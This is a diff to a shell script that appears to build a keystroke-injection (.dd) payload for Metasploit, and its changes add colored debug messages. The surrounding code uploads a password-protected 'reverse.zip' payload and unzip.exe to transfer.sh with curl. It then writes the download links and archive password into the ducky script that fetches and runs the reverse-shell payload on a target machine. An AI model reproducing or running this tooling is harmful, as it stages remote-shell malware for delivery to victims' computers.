@@ -193,23 +193,24 @@ else
 	echo "uploading the unzip.exe needed for unecrypted the zip archive"
 	curl --upload-file $TEMP/unzip.exe https://transfer.sh/unzip.exe > $LINK7ZIP
 	link_unzipexe="$(cat $LINK7ZIP)"
-	echo "\n LINK of unzip.exe :::: $link_unzipexe)"
+	echo "\033[1;31m\n:::: LINK of unzip.exe :::: $link_unzipexe ::::\033[0m"
 	echo "::::The .dd file is creating .."
 	rm -f $FOLDER_USEFUL/payload.dd
 	cp $DDFILEENCRYPTED $FOLDER_USEFUL/payload.dd
 	
+	echo "\033[1;33m\n::::::: DEBUG LOG ::::::::::\033[0m"
 	link_zip_payload="$(cat $LINKFILE)"
-	echo "\033[1;31m\n:::: BEFORE :::::\033[0m"
+	echo "\033[1;33m\n:::: BEFORE :::::\033[0m"
 	echo "Variable to put in python script :"
 	echo "Link of zip payload : $link_zip_payload"
 	echo "Archive Password : $password_zip"
 	echo "Link unzip.exe : $link_unzipexe"
-	echo "\033[1;32m\n:::: AFTER ::::\033[0m"
 
 	link_zip_payload="$(echo $link_zip_payload | sed -n 's/.*\.sh\/\(.*\)\/reverse\.zip/\1/p')"
 	
 	link_unzipexe="$(echo $link_unzipexe | sed -n 's/.*\.sh\/\(.*\)\/unzip\.exe/\1/p')"
 
+	echo "\033[1;33m\n:::: AFTER ::::\033[0m"
 	echo "Variable to put in python script :"
 	echo "Link of zip payload : $link_zip_payload"
 	echo "Archive Password : $password_zip"
@@ -217,6 +218,7 @@ else
 	python $HOME/msf/script/replace.py "$link_zip_payload" "$pasword_zip" "$link_unzipexe" $FOLDER_USEFUL/payload.dd
 	echo "::::The links have been changed:::::"
 	echo "::::The archive password has been added to the .dd file (if you encrypt the payload)"
+	echo "\033[1;33m\n::::::: DEBUG LOG DONE ::::::::::\033[0m"
 fi
 echo "\033[1;33m\n:::: If you have upload the payload check this:\n:::: If there is no new link, the upload failed \033[0m"
 echo "\nold link: \033[1;32m $(cat $HOME/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
